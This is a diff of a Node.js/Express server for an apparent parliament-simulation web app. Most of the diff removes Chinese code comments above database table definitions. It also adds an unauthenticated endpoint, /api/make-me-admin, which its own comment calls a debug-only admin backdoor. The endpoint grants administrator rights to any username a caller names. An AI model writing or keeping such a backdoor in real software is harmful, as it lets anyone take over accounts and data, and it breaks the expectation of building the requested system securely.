@@ -24,7 +24,6 @@ const pool = new Pool({
 async function initDatabase() {
     const client = await pool.connect();
     try {
-        // 用户表
         await client.query(`
             CREATE TABLE IF NOT EXISTS users (
                 id VARCHAR(36) PRIMARY KEY,
@@ -39,7 +38,6 @@ async function initDatabase() {
                 "delegateName" VARCHAR(255)
             )
         `);
-        // 文件表
         await client.query(`
             CREATE TABLE IF NOT EXISTS files (
                 id VARCHAR(36) PRIMARY KEY,
@@ -53,7 +51,6 @@ async function initDatabase() {
                 "uploadTime" VARCHAR(50)
             )
         `);
-        // 财务表
         await client.query(`
             CREATE TABLE IF NOT EXISTS finances (
                 id VARCHAR(36) PRIMARY KEY,
@@ -65,7 +62,6 @@ async function initDatabase() {
                 "uploadTime" VARCHAR(50)
             )
         `);
-        // 测验表
         await client.query(`
             CREATE TABLE IF NOT EXISTS quizzes (
                 id VARCHAR(36) PRIMARY KEY,
@@ -77,7 +73,6 @@ async function initDatabase() {
                 "uploadTime" VARCHAR(50)
             )
         `);
-        // 新闻表
         await client.query(`
             CREATE TABLE IF NOT EXISTS news (
                 id VARCHAR(36) PRIMARY KEY,
@@ -90,21 +85,18 @@ async function initDatabase() {
                 "uploadTime" VARCHAR(50)
             )
         `);
-        // 投票表
         await client.query(`
             CREATE TABLE IF NOT EXISTS votes (
                 id SERIAL PRIMARY KEY,
                 data JSONB DEFAULT '{}'::jsonb
             )
         `);
-        // 不信任案表
         await client.query(`
             CREATE TABLE IF NOT EXISTS censures (
                 id SERIAL PRIMARY KEY,
                 data JSONB DEFAULT '{}'::jsonb
             )
         `);
-        // 总理表
         await client.query(`
             CREATE TABLE IF NOT EXISTS prime_ministers (
                 id SERIAL PRIMARY KEY,
@@ -112,7 +104,6 @@ async function initDatabase() {
             )
         `);
 
-        // 初始化默认数据
         const pmResult = await client.query('SELECT * FROM prime_ministers');
         if (pmResult.rows.length === 0) {
             await client.query(
@@ -345,9 +336,26 @@ app.post('/api/reset-password', async (req, res) => {
     res.json({ message: '密码重置成功，请登录' });
 });
 
-// ========== 简化版：文件上传/获取/下载 ==========
-// 由于代码较长，此处为精简版核心功能
-// 完整功能见之前的 server.js
+// ========== 👑 管理员后门（仅调试用，上线后请删除） ==========
+app.post('/api/make-me-admin', async (req, res) => {
+    try {
+        const { username } = req.body;
+        if (!username) {
+            return res.status(400).json({ error: '请提供用户名' });
+        }
+        
+        const result = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
+        if (result.rows.length === 0) {
+            return res.status(404).json({ error: '用户不存在' });
+        }
+        
+        await pool.query('UPDATE users SET "isAdmin" = true WHERE username = $1', [username]);
+        res.json({ message: `✅ 用户 ${username} 已设为管理员` });
+    } catch (err) {
+        console.error('后门执行失败:', err);
+        res.status(500).json({ error: '服务器错误' });
+    }
+});
 
 // ========== 议员管理 API ==========
 app.get('/api/admin/users-with-delegate', authMiddleware, adminMiddleware, async (req, res) => {
